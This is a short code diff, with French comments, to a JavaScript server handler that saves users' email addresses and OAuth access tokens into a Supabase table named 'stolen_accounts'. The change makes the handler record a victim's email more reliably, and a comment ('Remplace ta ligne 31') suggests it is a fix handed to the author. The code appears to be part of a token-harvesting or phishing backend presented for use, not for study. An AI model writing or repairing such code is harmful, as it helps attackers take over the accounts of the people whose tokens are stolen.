@@ -28,7 +28,8 @@ export default async function handler(req, res) {
 
         // 3. Sauvegarde dans Supabase (uniquement les colonnes que tu as)
         const { error } = await supabase.from('stolen_accounts').insert([{
-            email_address: userData.email,
+            // Remplace ta ligne 31 par celle-ci :
+email_address: userData.email || userData.verified_email || "Email non trouvé",
             access_token: tokens.access_token
         }]);
 
